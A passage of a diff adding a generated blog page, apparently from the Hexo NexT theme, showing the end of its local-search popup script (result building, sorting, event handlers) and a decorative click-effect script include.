+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+</body>
+</html>
